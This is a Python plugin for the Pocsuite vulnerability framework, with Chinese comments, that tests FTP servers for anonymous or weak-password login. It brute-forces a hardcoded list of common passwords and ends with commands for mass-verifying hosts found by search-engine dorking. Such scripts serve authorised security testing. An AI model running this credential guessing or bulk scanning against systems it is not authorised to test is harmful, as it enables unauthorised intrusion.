#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
#requests 
from pocsuite.api.request import req
#register
from pocsuite.api.poc import register
#report
from pocsuite.api.poc import Output, POCBase
#url转换host
from pocsuite.lib.utils.funs import url2ip

#基础基类
class FtpPOC(POCBase):
	vulID = '33'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
	version = '1' #默认为1
	vulDate = '2018-05-22' #漏洞公开的时间,不知道就写今天

	author = 'fanyingjie' #  PoC作者的大名
	createDate = '2018-05-22'# 编写 PoC 的日期
	updateDate = '2018-05-22'# PoC 更新的时间,默认和编写时间一样
	references = "http://www.freebuf.com/articles/web/6088.html"# 漏洞地址来源,0day不用写
	name = 'ftp Unauthorized access'# PoC 名称
	appPowerLink = ''# 漏洞厂商主页地址
	appName = 'ftp'# 漏洞应用名称
	appVersion = 'all versions'# 漏洞影响版本
	vulType = 'Weak-Password'#漏洞类型,类型参考见 漏洞类型规范表
	desc = '''
		ftp 存在弱口令
	''' # 漏洞简要描述
	samples = []# 测试样列,就是用 PoC 测试成功的网站
	install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
	cvss = u"严重" #严重,高危,中危,低危

	#指纹方法
	def _fingerprint(self):
		pass
		
	#验证模块 pocsuite -r 1-redis.py -u 10.1.5.26 --verify
	def _verify(self):
		result={}
		vul_url = '%s' % self.url
		import re
		import time
		import ftplib
		from pocsuite.lib.utils.funs import url2ip
		_port = re.findall(':(\d+)\s*', vul_url)
		if len(_port) != 0:
			_host = url2ip(vul_url)[0]
			_port = int(url2ip(vul_url)[1])
		else :
			_host = url2ip(vul_url)
			_port = 21

		#判断端口是否开放	
		import socket
		sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sk.settimeout(1)
		try:
			sk.connect((_host,_port))
			#print 'Server port is OK!'
		except Exception:
		        return self.save_output(result)
		sk.close()


		flag = False
		payload = "弱口令"
		# username = ["www","db","wwwroot","data","web","ftp","anonymous","admin","Admin","Administrator","administrator","root","ADMIN"]
		username = ['anonymous',]
		password = ["","toor","1234","123456","admin","Admin","ADMIN","admin123","Admin123","root","root123","123.com"'123456','admin','root','password','123123','123','1','',
			'P@ssw0rd!!','qwa123','12345678','test','123qwe!@#',
		  '123456789','123321','1314520','666666','woaini','fuckyou','000000',
		  '1234567890','8888888','qwerty','1qaz2wsx','abc123','abc123456',
		  '1q2w3e4r','123qwe','159357','p@ssw0rd','p@55w0rd','password!',
		  'p@ssw0rd!','password1','r00t','system','111111','admin']
		for u in username:
			for p in password:
				socket.setdefaulttimeout(1)
				ftp = ftplib.FTP()
				try:
					print u, p
					ftp.connect(_host,_port)
					ftp.login(u,p)
					result['VerifyInfo'] = {}
					result['VerifyInfo']['URL'] = _host
					result['VerifyInfo']['Payload'] = u+p
					return self.save_output(result)
				except Exception,e:
					ftp.close()
					continue
		print '[+]33 poc done'
		return self.save_output(result)
	#攻击模块
	def _attack(self):
		result = {}
		return self._verify()


	#输出报告
	def save_output(self, result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail()
		return output


#注册类
register(FtpPOC)


"""
PoC 编写规范及要求说明 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md

使用方法 https://github.com/knownsec/Pocsuite/blob/master/docs/translations/USAGE-zh.md

集成 Pocsuite https://github.com/knownsec/Pocsuite/blob/master/docs/INTEGRATE.md

钟馗之眼 批量验证
pocsuite -r 1-redis-getshell.py --verify --dork "redis"  --max-page 50 --search-type host --report report.html
pocsuite -r 1-redis-getshell.py --verify -f results.txt --threads 10 --report report.html
"""
